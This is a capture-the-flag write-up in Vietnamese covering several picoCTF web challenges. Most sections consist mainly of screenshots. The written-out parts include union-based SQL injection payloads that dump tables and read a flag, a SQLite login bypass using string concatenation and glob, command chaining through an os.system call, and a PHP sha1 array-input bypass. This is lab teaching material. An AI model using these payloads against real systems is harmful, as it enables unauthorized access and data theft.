# Pico

# 3v@l

![Screenshot 2025-05-06 145459](https://github.com/user-attachments/assets/7341be37-c7dd-452b-9bd5-c16d7c1f9255)

![Screenshot 2025-05-06 145355](https://github.com/user-attachments/assets/c7c3347d-3de3-472a-8d19-29883e1888e6)


# Trickster

![Screenshot 2025-05-06 155332](https://github.com/user-attachments/assets/b1b381bd-837e-408d-be81-cd3efdeac7fe)

![Screenshot 2025-05-06 155403](https://github.com/user-attachments/assets/6f13e065-7c1f-4f66-ab63-f8b5fc0fa6da)

![Screenshot 2025-05-06 155256](https://github.com/user-attachments/assets/ac5c313c-f361-458a-8539-4f0531317528)

![Screenshot 2025-05-06 155535](https://github.com/user-attachments/assets/cf092a89-0610-4e25-b710-7f2a8bd808de)

![Screenshot 2025-05-06 155628](https://github.com/user-attachments/assets/7bc6fb7c-7383-4ff6-a2ee-710ed70c4044)

![Screenshot 2025-05-06 155652](https://github.com/user-attachments/assets/51c486c3-f0db-4f08-b895-2663c972f65a)

![Screenshot 2025-05-06 160930](https://github.com/user-attachments/assets/5728cb41-4208-4af7-8109-5a9f1a6f889b)


# No Sql Injection
![Screenshot 2025-05-06 164913](https://github.com/user-attachments/assets/4b93f124-856c-4681-9027-c002a5ca2cfd)
Base64


# SOAP
![image](https://github.com/user-attachments/assets/66b72268-993f-4abe-a155-b48ce205c653)

![image](https://github.com/user-attachments/assets/e85f7fff-fa60-434e-bf56-02d3efab8184)


# SQLI

![image](https://github.com/user-attachments/assets/85cd66b8-317f-450f-8e67-07690551feda)

Lấy các bảng bằng payload như sau
>a' union select 1,name,3 from sqlite_master where type='table'-- -

![image](https://github.com/user-attachments/assets/f0cc536a-7494-4c2b-99e5-4c918f7ac6ef)

Kiểm tra bảng more_table

>a' union select 1,sql,3 from sqlite_master where name='more_table'-- -

KIểm tra cột flag trong bảng more_table

>a' union select flag,2,3 from more_table-- -

![image](https://github.com/user-attachments/assets/90e55f04-5245-4a7c-a5bf-c5ca3ee1a075)

# MatchTheRegex

![image](https://github.com/user-attachments/assets/c7b34f81-2f2c-437a-b108-c16e5f416f6b)
.*? bắt tất cả các kí tự bất kỳ, số lượng ít nhất cả thể, nghĩa là chỉ lấy } đầu tiên bắt gặp

Nếu không có ? sau * thì nó sẽ khớp tới } cuối cùng trong chuỗi lớn

![image](https://github.com/user-attachments/assets/d3835e3f-9f22-4148-95cf-005ace686b62)
![Screenshot 2025-05-06 183102](https://github.com/user-attachments/assets/6961aae8-79a0-4916-b4e1-49a36da9fb96)

# Caas
![image](https://github.com/user-attachments/assets/746e5afd-8d24-4158-85f6-27ad42af2db4)

>os.system("cowsay " + user_input)

trong shell dấu ; cho phép thực thi nhiều lệnh liên tiếp

![image](https://github.com/user-attachments/assets/f7c67758-e2ff-49d4-a113-9260cd3756d4)
![image](https://github.com/user-attachments/assets/4db39461-ec20-4caa-babf-ed59fb379acf)



# Web Gauntlet 2
![Screenshot 2025-05-07 122359](https://github.com/user-attachments/assets/eaa96d1c-8151-43bd-b10b-7fd44dad9305)

![image](https://github.com/user-attachments/assets/7f39cc63-2344-4762-810b-f24cf18d9deb)

Username là admin nhưng admin đã bị chặn =))), Trong Sqlite || là toán tử để nối chuỗi
>username: adm'||'in
>password: ' glob '*
SELECT username, password FROM users WHERE username='adm'||'in' AND password='' glob '*'

Vậy tại sao có thể bypass được password, '' là 1 chuỗi rỗng glob sẽ so sánh với '\*' nếu khớp trả về true mà '*' khớp với bất kì chuỗi nào => trả về true

![Screenshot 2025-05-07 123050](https://github.com/user-attachments/assets/98af7f57-76ce-450e-a32f-f8957c526564)
![image](https://github.com/user-attachments/assets/596a372d-822f-4294-a861-af9f9301c260)

# It is my Birthday
Gửi 2 file pdf có hàm băm giống nhau để lấy flag
https://www.mscs.dal.ca/~selinger/md5collision/ tải về 2 file hello.exe và erase.exe và đổi lại .pdf

![Screenshot 2025-05-07 143003](https://github.com/user-attachments/assets/7f556d34-6530-493d-ba94-ff9da58cc125)
![Screenshot 2025-05-07 142953](https://github.com/user-attachments/assets/0eae98ab-c92a-4f4c-878c-dc089825568c)


# Apriti sesamo

![Screenshot 2025-05-07 153124](https://github.com/user-attachments/assets/60e8a331-071a-4cc1-92d7-8de47ce51add)
![image](https://github.com/user-attachments/assets/cf1072aa-14bb-42a0-b29d-f9c8c11aac9f)

 Gợi ý liên quan tới Emacs, trong trình soạn thảo emacs khi chỉnh sửa 1 file thì file gốc sẽ được lưu lại và thêm ~ và cuối. Ví dụ file mới là index.php thì file cũ sẽ là index.php~

 ![Screenshot 2025-05-07 153524](https://github.com/user-attachments/assets/e442c091-1605-4d30-b497-a5d2c8b6d22e)

 Sau khi thêm ~ vào cuối thì ta đã nhận được một đoạn mã php

 ![Screenshot 2025-05-07 153615](https://github.com/user-attachments/assets/12067edc-2b2c-4f7d-b87b-32eeef911e5b)

 Chú ý vào đoạn code có flag, khi thảo mãn điều kiện thì flag sẽ được đọc. Vậy làm sao để 2 hàm băm có thể giống nhau?

 Ta có thể làm cho 2 hàm băm nhận giá trị null khi đó null === null , thỏa mản

 Vì php không thể hash array nên ta sẽ cho đầu vào là 1 array

 ![Screenshot 2025-05-07 154152](https://github.com/user-attachments/assets/85b8b188-e392-46f9-aa9d-23a039bd0499)

 Ta thêm [] vào sau username và pwd thì nó sẽ thành 
 
 else if (sha1(array(123) === sha1(array(456)) {
 
 => if (null === null)






























